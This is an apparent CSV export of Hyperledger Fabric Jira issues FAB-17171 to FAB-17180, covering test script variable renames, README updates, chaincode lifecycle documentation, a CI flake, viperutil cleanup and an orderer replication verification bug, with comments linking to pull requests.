/cc [~jyellick]",,jyellick,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-13584,,,No,,Unset,No,,,"1|i00n2e:8zl4",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),jyellick,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Dec/19 1:14 AM;jyellick;The differing casing on the JSON with the package command is definitely an oversight that was missed when migrating from the upper-case to the lower-case names.  Passing on the metadata.json unmolested to the external builder is a separate issue, but these should be easy enough to tackle together.;;;","10/Dec/19 5:27 AM;jyellick;https://github.com/hyperledger/fabric/pull/383

Will open a second PR to handle the different-casing in the peer CLI.;;;","11/Dec/19 12:44 AM;jyellick;https://github.com/hyperledger/fabric/pull/385

For the peer CLI;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"convert fabric-test scripts to replace genesis with bootstrap, method and file",FAB-17171,43510,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,03/Dec/19 1:13 AM,11/Jan/21 2:31 AM,28/Oct/23 3:09 AM,11/Jan/21 2:31 AM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Although the old variable names will be deprecated, our tests should continue to work in 2.0 as is, (i.e. it is good that our scripts work as they are today, per FAB-17124). However, going forward, we should update our launcher scripts to use new names of two environment variables. Change:

ORDERER_GENERAL_GENESISMETHOD to ORDERER_GENERAL_BOOTSTRAPMETHOD

ORDERER_GENERAL_GENESISFILE to ORDERER_GENERAL_BOOTSTRAPFILE

Refer also to:

[https://github.com/hyperledger/fabric/pull/303]

https://jira.hyperledger.org/browse/FAB-17116

https://jira.hyperledger.org/browse/FAB-16477

 ",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17124,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4v",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update fabric-test Readme files and Contributions guide,FAB-17172,43512,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,scottz,scottz,scottz,03/Dec/19 2:00 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,28/Jan/20 12:16 AM,v1.4.5,v2.0.0,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Rewrite fabric-test/Readme file appropriate for use with github and Azure.

Remove references to python test drivers and other outdated test suites and information from existing Readme.

Include workflow instructions for contributions, using github, and adding tests to our new automation suites and tools, similar to this [https://github.com/hyperledger/fabric-test/tree/master/feature#how-to-contribute] which is being removed.

For reference, a Contributions Doc in fabric provides general guidelines to all the projects. [https://hyperledger-fabric.readthedocs.io/en/latest/CONTRIBUTING.html#contribution-guide]",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17159,FAB-16615,,,,,FAB-16581,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|hzwqfo:j",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),scottz,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Dec/19 1:06 AM;scottz;After our discussion about process and AZP pipelines yesterday, [~rameshthoomu] offered these helpful steps, to help with describing workflow:

 
1. Remove existing gerrit reference from your local machine
2. Fork fabric-test repository into your GitHub account. (Do this from your GitHub UI)
3. git clone https://github.com/hyperledger/fabric-test
4. git remote add upstream https://github.com/hyperledger/fabric-test.git
5. git checkout -b <branch_name>
6. <add changes> and commit your changes with ""git add <list_of_files>"" && ""git commit -m ""Commit Message"" or ""git commit -s""
7. git push -f origin <branch_name>  Use -f to force push the changes to avoid multiple commits.
8. Submit Pull Request from your GitHub remote repository (forked repository) on upstream remote repository.
9. git pull upstream master (to Pull the latest changes from your upstream repository) [ git pull does both fetch and merge ]
10. git push -f origin master ( To sync your local changes with your forked repository). Use -f to force push the changes to avoid multiple commits.
11. Once PR is merged, if you want, remove branch `git branch -d <branch_name> or git branch -D <branch_name>`
12. To remove from your GitHub remote, use this command to delete from local and push to GitHub remote `git push origin -d <branch_name>` [ will keep your branch in local but will delete from GitHub remote ] or git push origin -D <branch_name>` [ Will delete from local and GitHub Remote];;;","06/Dec/19 1:28 AM;scottz;There is no UI cherry pick like Gerrit had. You just checkout release-1.4 on the CLI and do:

  {{git cherry-pick <commit hash>}};;;","25/Jan/20 7:03 AM;scottz;[https://github.com/hyperledger/fabric-test/pull/71]

This update cleans up the Readme files, and refers to the Fabric contribution-guide. Decided not necessary to put the github workflow statements in the previous comment in the Readme.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update doc to reflect chaincode starts after commit,FAB-17173,43513,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,03/Dec/19 2:52 AM,15/Jan/20 8:22 PM,28/Oct/23 3:09 AM,15/Jan/20 8:22 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,Content in docs reflects older flow where the first invoke of the chaincode. The chaincode lifecycle has been updated to so that the chaincode starts after the chaincode definition has been committed to the channel.,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-11237,,,No,,Unset,No,,,"1|i015l7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jan/20 6:05 AM;negupta;https://github.com/hyperledger/fabric/pull/450;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NWO Deploy Fails When Launching Network,FAB-17174,43514,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,btl5037,btl5037,03/Dec/19 6:06 AM,04/Dec/19 5:21 AM,28/Oct/23 3:09 AM,04/Dec/19 5:21 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,ci-flake,,,,,"We have a number of tests timing out while waiting for the NWO Network Launch to start up. This has been exhibited in multiple jobs. Attaching two set of logs. This is the offending `eventually` the job is timing out on:

[https://github.com/hyperledger/fabric/blob/master/integration/nwo/deploy.go#L249]

And the logs:

[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/2903/logs/69]

[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/2901/logs/61]",,btl5037,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015lf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Dec/19 6:06 AM;btl5037;[~caod];;;","04/Dec/19 12:15 AM;caod;Seems potentially related to https://jira.hyperledger.org/browse/FAB-17165?focusedCommentId=65942&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-65942;;;","04/Dec/19 5:21 AM;caod;Closing as duplicate of FAB-17165;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create trigger workflow in fabric-test,FAB-17175,43516,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,03/Dec/19 6:48 AM,05/Dec/19 3:03 AM,28/Oct/23 3:09 AM,05/Dec/19 3:03 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Create trigger workflow in fabric-test,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015lv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Dec/19 6:57 AM;rameshthoomu;[ https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34477/|https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34477/]

[https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34475/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make viperutil map decode hooks consistent,FAB-17176,43519,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,jyellick,jyellick,03/Dec/19 1:11 PM,18/Dec/19 1:24 AM,28/Oct/23 3:09 AM,18/Dec/19 1:24 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"For whatever reason, we call functions that return function literals for most of the viperutil stuff, when we could just use the function literals themselves.

https://gerrit.hyperledger.org/r/c/fabric/+/34199/3/common/viperutil/config_util.go",,jyellick,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znr",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),jyellick,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Dec/19 1:27 AM;tsharris;[https://github.com/hyperledger/fabric/pull/424];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cluster replication verifies config block with the config block itself in case it's the last block in the buffer,FAB-17177,43525,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,03/Dec/19 10:34 PM,19/Dec/19 10:17 PM,28/Oct/23 3:09 AM,19/Dec/19 10:17 PM,v1.4.4,v2.0.0,,,,,,,,v1.4.5,v2.0.0,,,fabric-orderer,,,,,,,,,0,,,,,,"The cluster replication verifies blocks by pulling them in batches, and performs hash chain verification + verifies the signatures of the last block in the chain.

It uses the bundle stored in the global config structures, but in case it comes across a config block in the middle of the batch, it switches to use a bundle constructed from that config block.

However, if the config block is the last block in the batch - it accidentally verifies it twice: once with the config block before it (as expected) and once with the config block itself (which is unexpected).

 

 ",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015nf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Dec/19 10:58 PM;yacovm;[2.0 PR|https://github.com/hyperledger/fabric/pull/355/commits/7d42ceee215581e67234a44d58d6a27b1097f179]  [1.4.5 PR|https://github.com/hyperledger/fabric/pull/356];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create a golang (ginkgo) test driver for fabric-test long running k8s test suite,FAB-17178,43526,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,rameshthoomu,rameshthoomu,04/Dec/19 1:07 AM,29/Jan/20 1:01 PM,28/Oct/23 3:09 AM,22/Jan/20 3:20 AM,v1.4.4,v2.0.0,,,,,,,,v1.4.4,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,Create a golang (ginkgo) test driver for fabric-test long running k8s test suite in both master and release-1.4 branches.,,bharadwajambati1,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17378,,,,,,,,,,,,,,,,FAB-17423,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16160,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8i",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,rameshthoomu,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Dec/19 1:29 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/28];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create a golang (ginkgo) test driver for fabric-test testYourChaincode test suite,FAB-17179,43527,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,rameshthoomu,rameshthoomu,04/Dec/19 1:13 AM,22/Jan/20 6:37 AM,28/Oct/23 3:09 AM,22/Jan/20 6:37 AM,v1.4.4,v2.0.0,,,,,,,,v1.4.4,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,Create a golang (ginkgo) test driver for fabric-test testYourChaincode test suite in both master and release-1.4 branches,,rameshthoomu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16160,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rc",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 6:37 AM;scottz;This tool was never used. And has been removed, so this task is no longer necessary.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Standardize code in operator tool,FAB-17180,43528,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,04/Dec/19 1:16 AM,10/Dec/19 5:40 AM,28/Oct/23 3:09 AM,09/Dec/19 3:31 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx4",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Dec/19 1:28 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/17/commits/a9d69fc7cdb63fb1a4040fd50d9f7e598acbf548];;;","10/Dec/19 12:29 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/23/commits/ce3eb3df0d8fda343039654fb08265fa90190947] for release-1.4 branch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
